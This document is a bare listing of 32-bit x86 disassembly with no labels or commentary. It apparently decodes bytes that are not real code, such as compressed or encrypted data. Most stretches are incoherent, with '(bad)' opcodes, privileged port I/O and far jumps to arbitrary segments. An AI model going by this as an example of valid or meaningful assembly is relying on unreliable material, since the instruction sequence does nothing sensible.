  41b9f4:	mov    ch,dl
  41b9f6:	xor    dh,BYTE PTR [edx-0x29]
  41b9f9:	push   ebp
  41b9fa:	out    0x83,al
  41b9fc:	jge    0x41ba15
  41b9fe:	lea    eax,[edx]
  41ba00:	loopne 0x41ba0f
  41ba02:	daa    
  41ba03:	aaa    
  41ba04:	fs pushf 
  41ba06:	or     al,0x31
  41ba08:	mov    ebx,0xa3b69fcc
  41ba0d:	pop    edi
  41ba0e:	test   al,0x7c
  41ba10:	push   0x8e3370df
  41ba15:	pop    esi
  41ba16:	mov    ch,0xc8
  41ba18:	push   0xffffff9a
  41ba1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba1b:	and    edi,DWORD PTR [esi]
  41ba1d:	push   ss
  41ba1e:	mov    ch,ah
  41ba20:	xor    eax,0x1b8086b
  41ba25:	inc    esp
  41ba26:	cmp    eax,0xd2983d05
  41ba2b:	adc    edx,DWORD PTR [esi-0x6f]
  41ba2e:	xor    eax,esp
  41ba30:	push   esi
  41ba31:	pop    edx
  41ba32:	and    DWORD PTR [ebp+0x34],esi
  41ba35:	jmp    0x15ce:0xd06b5fad
  41ba3c:	mov    DWORD PTR [edx+edi*4+0x2a4e7998],ecx
  41ba43:	xor    dl,BYTE PTR [eax+0x70f8f53b]
  41ba49:	and    edx,DWORD PTR [eax+edx*1-0x1a654cc1]
  41ba50:	inc    esi
  41ba51:	(bad)  
  41ba52:	pop    esi
  41ba53:	clts   
  41ba55:	popa   
  41ba56:	cdq    
  41ba57:	ins    BYTE PTR es:[edi],dx
  41ba58:	ss std 
  41ba5a:	(bad)  
  41ba5b:	mov    dl,0x19
  41ba5d:	out    dx,eax
  41ba5e:	(bad)  
  41ba5f:	pop    eax
  41ba60:	ret    0x9fa2
  41ba63:	call   0x91c8:0xca2a591a
  41ba6a:	xor    DWORD PTR [ecx+0x2e],esi
  41ba6d:	xchg   esp,eax
  41ba6e:	xchg   edx,eax
  41ba6f:	adc    al,dh
  41ba71:	push   eax
  41ba72:	add    BYTE PTR [edx],ch
  41ba74:	aad    0x67
  41ba76:	(bad)  ds:0xe46155f9
  41ba7c:	mov    edi,DWORD PTR [ecx+0x722c8ac8]
  41ba82:	sbb    DWORD PTR [ebx],0xffffffcf
  41ba85:	push   ss
  41ba86:	xchg   esi,eax
  41ba87:	shr    bh,1
  41ba89:	push   ecx
  41ba8a:	push   cs
  41ba8b:	or     DWORD PTR [ecx+0x5e2d0212],esp
  41ba91:	or     eax,0x5859a2da
  41ba96:	stos   DWORD PTR es:[edi],eax
  41ba97:	add    dh,BYTE PTR [esi-0x21]
  41ba9a:	jno    0x41ba99
  41ba9c:	jle    0x41bac8
  41ba9e:	scas   al,BYTE PTR es:[edi]
  41ba9f:	enter  0xc9ea,0x7a
  41baa3:	popf   
  41baa4:	outs   dx,BYTE PTR ds:[esi]
  41baa5:	push   esp
  41baa6:	and    BYTE PTR [ecx],bl
  41baa8:	and    al,0x3b
  41baaa:	xchg   edx,eax
  41baab:	stos   DWORD PTR es:[edi],eax
  41baac:	stos   BYTE PTR es:[edi],al
  41baad:	add    al,0x66
  41baaf:	ret    
  41bab0:	cld    
  41bab1:	add    ebp,DWORD PTR [ecx-0x41b7fd36]
  41bab7:	sub    DWORD PTR [edi-0x5c],edi
  41baba:	mov    esp,0xdb340ee
  41babf:	pop    esi
  41bac0:	push   ds
  41bac1:	or     BYTE PTR [esi-0x1fd6802d],dl
  41bac7:	or     dl,dh
  41bac9:	loopne 0x41bab4
  41bacb:	fstp   TBYTE PTR [ebx+0x70]
  41bace:	lahf   
  41bacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bad0:	pop    es
  41bad1:	xchg   esi,eax
  41bad2:	xor    cl,BYTE PTR [esp+ecx*2+0x21]
  41bad6:	dec    esi
  41bad7:	ins    DWORD PTR es:[edi],dx
  41bad8:	pusha  
  41bad9:	inc    edi
  41bada:	inc    edx
  41badb:	popf   
  41badc:	test   al,0xa3
  41bade:	push   edi
  41badf:	add    bh,BYTE PTR [edx]
  41bae1:	mov    dh,0xba
  41bae3:	add    ecx,DWORD PTR [edx-0x79]
  41bae6:	sub    edx,DWORD PTR [edx]
  41bae8:	sbb    eax,DWORD PTR [ebx]
  41baea:	mov    bl,0xdc
  41baec:	dec    edi
  41baed:	jo     0x41bb23
  41baef:	xchg   ebp,eax
  41baf0:	dec    edi
  41baf1:	(bad)  
  41baf2:	icebp  
  41baf3:	add    ebx,ecx
  41baf5:	mov    bl,0xb0
  41baf7:	and    dh,BYTE PTR [eax-0x72]
  41bafa:	jp     0x41bae4
  41bafc:	push   ebp
  41bafd:	pop    ss
  41bafe:	add    eax,0x4d77155a
  41bb03:	push   cs
  41bb04:	das    
  41bb05:	cli    
  41bb06:	xchg   dh,ch
  41bb08:	adc    al,0x60
  41bb0a:	pop    eax
  41bb0b:	lock mov edi,0x37140941
  41bb11:	cs pop ds
  41bb13:	mov    ecx,0xdbecf645
  41bb18:	cs sbb eax,0xe4b48af0
  41bb1e:	add    ebp,DWORD PTR [ecx+0x66]
  41bb21:	jbe    0x41bab7
  41bb23:	add    eax,0xd8555da
  41bb28:	push   eax
  41bb29:	pop    esp
  41bb2a:	inc    esi
  41bb2b:	xchg   ebp,eax
  41bb2c:	mov    ah,0x66
  41bb2e:	div    BYTE PTR [esi]
  41bb30:	sub    eax,0xc048c736
  41bb35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb37:	popf   
  41bb38:	xor    bl,BYTE PTR [ebp+0x7042c3c5]
  41bb3e:	enter  0x700c,0xfc
  41bb42:	int3   
  41bb43:	jecxz  0x41bad8
  41bb45:	leave  
  41bb46:	and    cl,BYTE PTR [ebp+0x41b61a53]
  41bb4c:	cmp    BYTE PTR [ecx-0x14],dh
  41bb4f:	pop    es
  41bb50:	add    esp,DWORD PTR [eax+0x6db72f92]
  41bb56:	lds    ebx,FWORD PTR [esi]
  41bb58:	jg     0x41bbb1
  41bb5a:	je     0x41bbca
  41bb5c:	jno    0x41bbdb
  41bb5e:	sahf   
  41bb5f:	sub    al,0xf4
  41bb61:	sub    BYTE PTR [ebx+0x37138ed7],bh
  41bb67:	and    eax,0x4d2864da
  41bb6c:	mov    cl,0x5a
  41bb6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb6f:	adc    ecx,eax
  41bb71:	mov    bl,0xfb
  41bb73:	mov    ebp,0x88fd6ad2
  41bb78:	int3   
  41bb79:	lahf   
  41bb7a:	sub    dh,BYTE PTR [edi]
  41bb7c:	in     al,dx
  41bb7d:	loopne 0x41bb18
  41bb7f:	jecxz  0x41bb95
  41bb81:	stos   DWORD PTR es:[edi],eax
  41bb82:	(bad)  
  41bb83:	mov    DWORD PTR [edi],0x5f781dda
  41bb89:	retf   
  41bb8a:	cdq    
  41bb8b:	(bad)  
  41bb8c:	stos   DWORD PTR es:[edi],eax
  41bb8d:	pushf  
  41bb8e:	scas   al,BYTE PTR es:[edi]
  41bb8f:	inc    ebx
  41bb90:	(bad)  
  41bb92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb93:	retf   
  41bb94:	daa    
  41bb95:	stc    
  41bb96:	pop    ebp
  41bb97:	xchg   esi,eax
  41bb98:	jmp    0xc425652e
  41bb9d:	scas   al,BYTE PTR es:[edi]
  41bb9e:	xor    al,0x2e
  41bba0:	xchg   ecx,eax
  41bba1:	not    BYTE PTR [eax+eiz*4+0x656993db]
  41bba8:	ret    0x67aa
  41bbab:	cld    
  41bbac:	or     edi,DWORD PTR [ebx-0x3a]
  41bbaf:	and    esi,DWORD PTR [edx]
  41bbb1:	dec    edi
  41bbb2:	jno    0x41bc21
  41bbb4:	xchg   DWORD PTR [ecx+0x4d],edi
  41bbb7:	xor    eax,0x6669cae9
  41bbbc:	gs jg  0x41bc3e
  41bbbf:	mov    eax,0x52119a04
  41bbc4:	cwde   
  41bbc5:	fidiv  WORD PTR [ebx-0x65]
  41bbc8:	int3   
  41bbc9:	xchg   esi,eax
  41bbca:	sub    BYTE PTR [edi],al
  41bbcc:	in     eax,dx
  41bbcd:	dec    esi
  41bbce:	sub    DWORD PTR [ebp-0x47],ebx
  41bbd1:	arpl   cx,ax
  41bbd3:	test   DWORD PTR [ebx+0x7c],esi
  41bbd6:	adc    BYTE PTR [eax+0x6c],al
  41bbd9:	jnp    0x41bbb9
  41bbdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbdc:	addr16 in al,dx
  41bbde:	dec    esp
  41bbdf:	sar    BYTE PTR [esi],cl
  41bbe1:	call   0x38537791
  41bbe6:	pop    edx
  41bbe7:	les    eax,FWORD PTR fs:[ebp+0x7131a41b]
  41bbee:	ret    0xceb
  41bbf1:	inc    esi
  41bbf2:	pslld  mm5,mm0
  41bbf5:	sub    BYTE PTR [ecx-0x7f309ec8],0x6a
  41bbfc:	and    eax,0x2c3d20eb
  41bc01:	comiss xmm2,DWORD PTR [esi+0x2e35badb]
  41bc08:	and    BYTE PTR [esp+edx*2+0x2465690c],dl
  41bc0f:	mov    cl,0x5f
  41bc11:	rol    DWORD PTR [ecx-0x74],1
  41bc14:	popa   
  41bc15:	je     0x41bbea
  41bc17:	cwde   
  41bc18:	cmc    
  41bc19:	in     al,0x9a
  41bc1b:	enter  0xb8af,0x2d
  41bc1f:	mov    ebx,fs
  41bc21:	pushf  
  41bc22:	sbb    eax,0xd7b8540b
  41bc27:	push   ebp
  41bc28:	and    al,BYTE PTR [ecx-0x4a2a8593]
  41bc2e:	stc    
  41bc2f:	ins    BYTE PTR es:[edi],dx
  41bc30:	icebp  
  41bc31:	mov    ebp,0xdf8db4f9
  41bc36:	out    0xe4,al
  41bc38:	scas   al,BYTE PTR es:[edi]
  41bc39:	das    
  41bc3a:	jl     0x41bc0f
  41bc3c:	mov    bl,0x1f
  41bc3e:	jne    0x41bc1b
  41bc40:	imul   DWORD PTR ds:0xa8117e97
  41bc46:	cli    
  41bc47:	fnstcw WORD PTR [edx]
  41bc49:	xor    al,0x4
  41bc4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4c:	mov    ch,0x85
  41bc4e:	cmp    esi,DWORD PTR [edi]
  41bc50:	sub    DWORD PTR [ebx],ecx
  41bc52:	or     al,0xb4
  41bc54:	push   ss
  41bc55:	pop    ss
  41bc56:	test   al,0x5d
  41bc58:	in     eax,0x7c
  41bc5a:	xor    al,ah
  41bc5c:	sbb    bl,BYTE PTR [esi]
  41bc5e:	dec    esp
  41bc5f:	(bad)  
  41bc60:	pop    ss
  41bc61:	sbb    BYTE PTR [esi+0x301f4a6f],dh
  41bc67:	mov    ds:0xea6bcd4c,eax
  41bc6c:	pop    esp
  41bc6d:	mov    es,ebp
  41bc6f:	je     0x41bc1b
  41bc71:	pop    esp
  41bc72:	fimul  WORD PTR [esi]
  41bc74:	xlat   BYTE PTR ds:[ebx]
  41bc75:	mov    ecx,0xd0cf80ff
  41bc7a:	das    
  41bc7b:	inc    eax
  41bc7c:	into   
  41bc7d:	push   edi
  41bc7e:	popa   
  41bc7f:	aad    0xcf
  41bc81:	int3   
  41bc82:	add    edx,DWORD PTR [edi+0x56]
  41bc85:	sub    al,BYTE PTR [ecx+0x5]
  41bc88:	pop    esp
  41bc89:	adc    DWORD PTR ds:0xb65f8053,esp
  41bc8f:	loope  0x41bc2d
  41bc91:	xchg   edx,eax
  41bc92:	mov    bl,0x24
  41bc94:	rcr    DWORD PTR [ebx+0x307e5da8],0xef
  41bc9b:	jns    0x41bc8c
  41bc9d:	and    ch,BYTE PTR [ebx]
  41bc9f:	xor    DWORD PTR [esi-0x1c],0x31
  41bca3:	rol    DWORD PTR [esi],0xa
  41bca6:	cmp    ah,BYTE PTR [edx]
  41bca8:	jo     0x41bc75
  41bcaa:	xchg   ebx,eax
  41bcab:	aam    0x50
  41bcad:	dec    esp
  41bcae:	cmp    eax,0x341d01be
  41bcb3:	je     0x41bc65
  41bcb5:	inc    ecx
  41bcb6:	mov    ch,0x88
  41bcb8:	imul   ebp,esi,0x5438923c
  41bcbe:	pop    esi
  41bcbf:	repnz xor BYTE PTR [ecx-0x956ef1b],cl
  41bcc6:	ss loop 0x41bd35
  41bcc9:	into   
  41bcca:	clc    
  41bccb:	xchg   esi,eax
  41bccc:	xchg   ebx,eax
  41bccd:	pop    ss
  41bcce:	jge    0x41bc53
  41bcd0:	call   0xc1e20ebe
  41bcd5:	mov    ds,WORD PTR ds:0x85b4cc55
  41bcdb:	pop    ss
  41bcdc:	mov    ss,WORD PTR [ebx]
  41bcde:	ja     0x41bcd7
  41bce0:	stos   BYTE PTR es:[edi],al
  41bce1:	mov    DWORD PTR [ebx],esi
  41bce3:	cmp    ecx,0x356546e6
  41bce9:	lea    ebp,[ecx-0x63]
  41bcec:	mov    dl,0x2e
  41bcee:	rol    DWORD PTR [ebx+esi*4-0x29],0x16
  41bcf3:	pop    eax
  41bcf4:	fimul  WORD PTR [edx+ecx*2-0x31]
  41bcf8:	dec    ebx
  41bcf9:	jns    0x41bd41
  41bcfb:	xchg   BYTE PTR [ecx-0x766f0b8a],cl
  41bd01:	and    eax,0x5e55a36
  41bd06:	leave  
  41bd07:	dec    ecx
  41bd08:	popa   
  41bd09:	jmp    DWORD PTR [ebp+0x5e]
  41bd0c:	popf   
  41bd0d:	mov    cl,0x10
  41bd0f:	mov    eax,0x4a295b0d
  41bd14:	int    0x7d
  41bd16:	(bad)  
  41bd17:	lea    edi,[ecx+0x796ec42b]
  41bd1d:	in     al,dx
  41bd1e:	dec    edi
  41bd1f:	popf   
  41bd20:	sar    DWORD PTR [esi-0x1798cf07],cl
  41bd26:	popf   
  41bd27:	sub    eax,0x9187aaa
  41bd2c:	imul   edx,ebp,0xffffffa3
  41bd2f:	or     edi,DWORD PTR [ebp-0x21]
  41bd32:	xor    cl,BYTE PTR fs:[ecx+0x5]
  41bd36:	xchg   ebp,eax
  41bd37:	push   0x5b
  41bd39:	js     0x41bdb5
  41bd3b:	les    esp,FWORD PTR [esi-0x42]
  41bd3e:	inc    eax
  41bd3f:	xor    al,BYTE PTR [ebp+0x4b]
  41bd42:	popf   
  41bd43:	dec    esp
  41bd44:	xchg   edx,eax
  41bd45:	mov    al,0xe0
  41bd47:	nop
  41bd48:	add    esp,DWORD PTR [ebp+0x70]
  41bd4b:	or     ecx,DWORD PTR [ecx-0x17]
  41bd4e:	scas   al,BYTE PTR es:[edi]
  41bd4f:	psubsb mm0,mm3
  41bd52:	out    dx,al
  41bd53:	daa    
  41bd54:	cli    
  41bd55:	aam    0xf3
  41bd57:	into   
  41bd58:	nop
  41bd59:	inc    eax
  41bd5a:	push   0x70
  41bd5c:	in     eax,0x9
  41bd5e:	cmp    BYTE PTR [edi+edi*1+0x14],ch
  41bd62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd63:	(bad)  
  41bd64:	push   ss
  41bd65:	pushf  
  41bd66:	data16 outs dx,BYTE PTR ds:[esi]
  41bd68:	push   cs
  41bd69:	test   edx,0xbc13af63
  41bd6f:	stos   DWORD PTR es:[edi],eax
  41bd70:	lds    eax,FWORD PTR [ebp-0x2ca2af8f]
  41bd76:	mov    WORD PTR [ebx+0x66829ac1],cs
  41bd7c:	sbb    DWORD PTR [ecx+0x4d],0x9
  41bd80:	and    DWORD PTR [edi-0x24],edi
  41bd83:	jp     0x41bd8b
  41bd85:	in     al,dx
  41bd86:	jge    0x41bdee
  41bd88:	add    ebx,esp
  41bd8a:	ins    BYTE PTR es:[edi],dx
  41bd8b:	cwde   
  41bd8c:	mov    bl,0x49
  41bd8e:	or     edi,edx
  41bd90:	es mov cl,0x2d
  41bd93:	mov    ebx,0x3e494e82
  41bd98:	mov    ch,BYTE PTR [ecx]
  41bd9a:	not    BYTE PTR [edx-0x26]
  41bd9d:	mov    bl,0x42
  41bd9f:	jmp    DWORD PTR [esi+0x19]
  41bda2:	mov    al,ds:0x94d1da5e
  41bda7:	jle    0x41bd82
  41bda9:	xchg   ebx,eax
  41bdaa:	(bad)  [edi]
  41bdac:	std    
  41bdad:	cmp    ecx,edx
  41bdaf:	ror    DWORD PTR [ebp-0x32],0x7e
  41bdb3:	(bad)  
  41bdb4:	sub    eax,0xf5a3945d
  41bdb9:	cld    
  41bdba:	(bad)  
  41bdbb:	mov    edx,0x5e49ece4
  41bdc0:	push   cs
  41bdc1:	mov    al,0x3e
  41bdc3:	call   0x36b36920
  41bdc8:	cmp    eax,0x95b666cf
  41bdcd:	mov    edx,0x833a4a9d
  41bdd2:	xor    edx,DWORD PTR [ebx]
  41bdd4:	repz xor DWORD PTR [ecx-0x49e8e7fc],ebp
  41bddb:	push   0x4
  41bddd:	jbe    0x41bdca
  41bddf:	jge    0x41bd88
  41bde1:	out    0x4a,eax
  41bde3:	popa   
  41bde4:	jecxz  0x41be41
  41bde6:	sbb    bh,al
  41bde8:	xor    dl,BYTE PTR [edx]
  41bdea:	push   0xffffffb0
  41bdec:	sbb    DWORD PTR [esi+eiz*4-0xd],0xffffff92
  41bdf1:	sub    BYTE PTR [edi-0x59],cl
  41bdf4:	into   
  41bdf5:	(bad)  
  41bdf6:	out    0x91,al
  41bdf8:	mov    ebp,0xa089950c
  41bdfd:	pop    ss
  41bdfe:	sub    BYTE PTR [edi],0x7c
  41be01:	bound  eax,QWORD PTR [eax]
  41be03:	addr16 xor al,0xa7
  41be06:	sub    eax,edi
  41be08:	out    0xf0,eax
  41be0a:	sar    eax,1
  41be0c:	inc    ebx
  41be0d:	jmp    0xc681:0xc0295a26
  41be14:	lds    ebp,FWORD PTR ds:0xb525adc3
  41be1a:	daa    
  41be1b:	or     bh,BYTE PTR [eax]
  41be1d:	sub    DWORD PTR [edx-0x61],edi
  41be20:	mov    cl,0x29
  41be22:	inc    edi
  41be23:	sti    
  41be24:	mov    bh,0x50
  41be26:	jle    0x41bdaa
  41be28:	adc    bl,0x6d
  41be2b:	hlt    
  41be2c:	retf   
  41be2d:	aam    0x5e
  41be2f:	pop    ds
  41be30:	nop
  41be31:	xor    al,0x14
  41be33:	adc    DWORD PTR [ebx],0x18
  41be36:	xchg   esi,eax
  41be37:	or     eax,0xa14b0c74
  41be3c:	adc    bh,BYTE PTR [ebp-0x662653c7]
  41be42:	cmp    al,0x60
  41be44:	mov    dl,0x6b
  41be46:	mov    ch,0x8a
  41be48:	frstor ds:0xdb14abb4
  41be4e:	push   esp
  41be4f:	imul   edx,DWORD PTR [ebp+0x4b2e35c8],0xbf3c2ea4
  41be59:	inc    esp
  41be5a:	xor    eax,0x25df81e9
  41be5f:	dec    ebp
  41be60:	mov    ebp,0xd364884e
  41be65:	cmp    esp,DWORD PTR [edx]
  41be67:	sbb    bh,al
  41be69:	lods   al,BYTE PTR ds:[esi]
  41be6a:	sbb    DWORD PTR [ebx+eax*4-0x1e],eax
  41be6e:	xchg   ecx,eax
  41be6f:	ins    DWORD PTR es:[edi],dx
  41be70:	push   esi
  41be71:	xchg   edx,eax
  41be72:	es pop esi
  41be74:	aad    0xa6
  41be76:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41be78:	(bad)  
  41be79:	sbb    eax,ebx
  41be7b:	shr    BYTE PTR [ecx],cl
  41be7d:	jno    0x41beb5
  41be7f:	jmp    0xf239b704
  41be84:	jae    0x41be83
  41be86:	ins    BYTE PTR es:[edi],dx
  41be87:	in     al,dx
  41be88:	test   eax,0xadb3333a
  41be8d:	arpl   WORD PTR [esi+0x52d6d9ab],ax
  41be93:	in     eax,dx
  41be94:	xchg   ecx,eax
  41be95:	imul   esi,DWORD PTR [edi-0x72104d0c],0xffffffc4
  41be9c:	shr    BYTE PTR [edi],cl
  41be9e:	fsub   QWORD PTR [eax+eiz*8+0x68b30278]
  41bea5:	jge    0x41be63
  41bea7:	adc    bl,BYTE PTR [esi-0x70]
  41beaa:	test   BYTE PTR [ecx],dh
  41beac:	imul   edx,DWORD PTR [esi+0x47],0x12b22667
  41beb3:	popf   
  41beb4:	and    DWORD PTR [ecx+eiz*1-0xf46a765],edi
  41bebb:	and    eax,0x83777915
  41bec0:	daa    
  41bec1:	mov    ecx,0x7424a99e
  41bec6:	push   esi
  41bec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bec8:	inc    esi
  41bec9:	xor    ebx,DWORD PTR [ebx-0x66]
  41becc:	push   ss
  41becd:	sub    al,0x92
  41becf:	and    bh,BYTE PTR [ebp-0x71ac0b28]
  41bed5:	push   esp
  41bed6:	xchg   DWORD PTR [esi],edi
  41bed8:	xchg   edi,eax
  41bed9:	nop
  41beda:	mov    ah,0x44
  41bedc:	push   ds
  41bedd:	test   BYTE PTR [eax+ebp*2],bl
  41bee0:	ss push cs
  41bee2:	aaa    
  41bee3:	pop    ebp
  41bee4:	xchg   BYTE PTR [esi-0x8],dh
  41bee7:	mov    ds:0x1da01afc,eax
  41beec:	xor    bh,0x3c
  41beef:	bound  eax,QWORD PTR [ebp-0x3a]
  41bef2:	add    edx,ebp
  41bef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bef5:	mov    ecx,0x10e1785e
  41befa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41befb:	push   0x31258552
  41bf00:	fucomi st,st(4)
  41bf02:	jg     0x41bf6c
  41bf04:	call   0x1384:0xb41da02
  41bf0b:	arpl   WORD PTR [eax-0x19],dx
  41bf0e:	push   0xffffff99
  41bf10:	jl     0x41be97
  41bf12:	mov    edx,0xdf2a76be
  41bf17:	pop    ds
  41bf18:	add    BYTE PTR [eax+0x199fa6e9],ah
  41bf1e:	imul   esp,ebp,0xffffff82
  41bf21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf22:	xor    cl,BYTE PTR [eax+0x5f]
  41bf25:	jae    0x41bf46
  41bf27:	clc    
  41bf28:	aas    
  41bf29:	outs   dx,BYTE PTR ds:[esi]
  41bf2a:	pop    edx
  41bf2b:	pop    ebx
  41bf2c:	popa   
  41bf2d:	sub    esp,edx
  41bf2f:	mov    ?,esi
  41bf31:	imul   ch
  41bf33:	sar    DWORD PTR [ebp-0x54ccb75],1
  41bf39:	push   ss
  41bf3a:	div    eax
  41bf3c:	aas    
  41bf3d:	jecxz  0x41bf1c
  41bf3f:	out    dx,eax
  41bf40:	jno    0x41bf8a
  41bf42:	inc    eax
  41bf43:	mov    ah,0xa3
  41bf45:	and    al,0x8e
  41bf47:	mov    ebp,edx
  41bf49:	icebp  
  41bf4a:	test   dh,al
  41bf4c:	mov    ds:0x802a3183,eax
  41bf51:	xor    al,0x14
  41bf53:	adc    eax,0x291a3c36
  41bf58:	push   eax
  41bf59:	fisub  WORD PTR [eax]
  41bf5b:	mov    eax,ds:0x3d5315f4
  41bf60:	inc    esi
  41bf61:	pop    esp
  41bf62:	lahf   
  41bf63:	dec    esi
  41bf64:	fisub  WORD PTR [ebp+0x5c044c27]
  41bf6a:	jecxz  0x41bfd1
  41bf6c:	pop    ebx
  41bf6d:	gs std 
  41bf6f:	pop    ecx
  41bf70:	jns    0x41bfce
  41bf72:	lock repnz xor eax,DWORD PTR [ebx-0x7008aec1]
  41bf7a:	xor    esi,DWORD PTR [esi-0x68]
  41bf7d:	in     eax,dx
  41bf7e:	jge    0x41bf28
  41bf80:	xchg   DWORD PTR [ecx+0x209db4f8],ebp
  41bf86:	test   DWORD PTR [eax*8-0xd76d6b0],edx
  41bf8d:	mov    esp,0x4052b464
  41bf92:	hlt    
  41bf93:	or     ebp,esi
  41bf95:	imul   esi,DWORD PTR [ecx],0x60edae7f
  41bf9b:	call   0x4e6f:0x768de64f
  41bfa2:	fcomp  QWORD PTR [eax]
  41bfa4:	dec    esp
  41bfa5:	out    0x4,al
  41bfa7:	xlat   BYTE PTR ds:[ebx]
  41bfa8:	or     DWORD PTR [edx],0xe45bdbc6
  41bfae:	jmp    0xb1be2dc6
  41bfb3:	in     al,0x9d
  41bfb5:	imul   edi,DWORD PTR [esi],0xeb068055
  41bfbb:	and    ebx,DWORD PTR [edi+0x1]
  41bfbe:	sti    
  41bfbf:	push   cs
  41bfc0:	mov    ebx,0x8c205f54
  41bfc5:	sti    
  41bfc6:	stos   DWORD PTR es:[edi],eax
  41bfc7:	rcl    DWORD PTR [ecx-0x46],1
  41bfca:	ret    0x9919
  41bfcd:	push   ds
  41bfce:	lea    eax,[ebp+0x3e1969b2]
  41bfd4:	test   al,0x4c
  41bfd6:	inc    ebx
  41bfd7:	stc    
  41bfd8:	call   0x5934:0x4db24906
  41bfdf:	aaa    
  41bfe0:	ficomp WORD PTR cs:[edi-0x39]
  41bfe4:	jns    0x41c05b
  41bfe6:	push   edx
  41bfe7:	icebp  
  41bfe8:	push   edi
  41bfe9:	lea    eax,[edx+0x63ba983d]
  41bfef:	iret   
  41bff0:	out    dx,al
  41bff1:	in     al,dx
  41bff2:	mov    eax,ds:0xde51e59b
  41bff7:	cld    
  41bff8:	retf   
  41bff9:	aad    0xd8
  41bffb:	inc    esi
  41bffc:	inc    ebx
  41bffd:	retf   0xb3be
  41c000:	lds    ebp,FWORD PTR [ecx+0x7b58f72a]
  41c006:	or     ah,BYTE PTR [eax]
  41c008:	pop    edx
  41c009:	mov    ecx,0x85319bf5
  41c00e:	adc    eax,0x2a7d8b6e
  41c013:	cmp    bl,ch
  41c015:	test   DWORD PTR [eax-0x7f],0x1e960da9
  41c01c:	pop    ds
  41c01d:	jg     0x41c077
  41c01f:	cmp    BYTE PTR [ebp-0x1e],ah
  41c022:	lods   eax,DWORD PTR ds:[esi]
  41c023:	xchg   DWORD PTR [edx+ebx*4],esi
  41c026:	hlt    
  41c027:	call   0x312d48ec
  41c02c:	mov    ecx,0x62269449
  41c031:	inc    esi
  41c032:	in     al,dx
  41c033:	xchg   ebx,eax
  41c034:	imul   ebx,DWORD PTR [edx+0x18],0xffffffe1
  41c038:	jb     0x41c032
  41c03a:	dec    ebx
  41c03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c03c:	lea    edx,[edi+0x3d]
  41c03f:	fmul   st(0),st
  41c041:	fimul  DWORD PTR [edi]
  41c043:	mov    ch,0x72
  41c045:	adc    ch,BYTE PTR [ebx+ebp*1+0x7f]
  41c049:	push   ds
  41c04a:	into   
  41c04b:	jno    0x41c025
  41c04d:	test   eax,0xf79c10db
  41c052:	sbb    DWORD PTR [ebp-0x13],ecx
  41c055:	inc    edi
  41c056:	mov    WORD PTR [eax],ds
  41c058:	fld    DWORD PTR [eax+0x18]
  41c05b:	push   ebp
  41c05c:	ret    
  41c05d:	das    
  41c05e:	pushf  
  41c05f:	cli    
  41c060:	adc    al,ch
  41c062:	cdq    
  41c063:	xlat   BYTE PTR ds:[ebx]
  41c064:	jl     0x41bfe9
  41c066:	stos   BYTE PTR es:[edi],al
  41c067:	fs jmp 0x2e2a8850
  41c06d:	jnp    0x41c041
  41c06f:	sbb    al,0x9a
  41c071:	iret   
  41c072:	mov    al,ds:0x2bcb8972
  41c077:	stos   DWORD PTR es:[edi],eax
  41c078:	cmp    al,0x15
  41c07a:	push   ss
  41c07b:	rol    BYTE PTR [ebx+0x72],cl
  41c07e:	in     eax,0xad
  41c080:	mov    al,0xd1
  41c082:	imul   ebx,DWORD PTR [eax+0x1ce16943],0x63
  41c089:	push   0x894f6c4b
  41c08e:	shr    DWORD PTR [eax-0x5d],0x85
  41c092:	sbb    eax,0x297897f6
  41c097:	jnp    0x41c0e1
  41c099:	(bad)  
  41c09a:	loopne 0x41c0ea
  41c09c:	inc    esp
  41c09d:	dec    edi
  41c09e:	mov    DWORD PTR [eax+0x54d69b32],ecx
  41c0a4:	pop    esp
  41c0a5:	sub    al,0xb2
  41c0a7:	pop    ecx
  41c0a8:	add    esp,DWORD PTR [esi-0x56f92934]
  41c0ae:	dec    ecx
  41c0af:	xchg   edx,eax
  41c0b0:	sbb    BYTE PTR ds:0x8e4ee2c4,ah
  41c0b6:	push   ds
  41c0b7:	outs   dx,DWORD PTR ds:[esi]
  41c0b8:	jl     0x41c05b
  41c0ba:	es and eax,0x9bf14748
  41c0c0:	cdq    
  41c0c1:	adc    al,0xa5
  41c0c3:	enter  0xeafb,0x1
  41c0c7:	xlat   BYTE PTR ds:[ebx]
  41c0c8:	xor    bh,BYTE PTR [eax-0x46]
  41c0cb:	jg     0x41c059
  41c0cd:	jno    0x41c0b2
  41c0cf:	sub    BYTE PTR [ebx-0x1231d852],bl
  41c0d5:	(bad)  
  41c0d6:	fwait
  41c0d7:	push   eax
  41c0d8:	pop    es
  41c0d9:	add    eax,0x31a2a940
  41c0de:	sar    dl,1
  41c0e0:	push   ebx
  41c0e1:	ficom  WORD PTR [eax-0x40]
  41c0e4:	sti    
  41c0e5:	xchg   ebp,eax
  41c0e6:	mov    edi,0xae47ff0c
  41c0eb:	pop    edi
  41c0ec:	sbb    al,0x58
  41c0ee:	ficomp WORD PTR [ecx]
  41c0f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0f1:	ror    DWORD PTR [edx+0x44d827e8],1
  41c0f7:	pop    ebp
  41c0f8:	dec    esp
  41c0f9:	jmp    FWORD PTR ds:0x951f748
  41c0ff:	sbb    BYTE PTR [esi+edx*8+0x72],ah
  41c103:	test   al,0xde
  41c105:	jb     0x41c132
  41c107:	dec    esi
  41c108:	mov    al,ds:0xaaa7088a
  41c10d:	cmp    eax,0x9884b8f9
  41c112:	mov    dh,0x3b
  41c114:	mov    ebp,ecx
  41c116:	xchg   edx,eax
  41c117:	pop    esp
  41c118:	sub    al,0x21
  41c11a:	mov    dl,0x59
  41c11c:	push   ebp
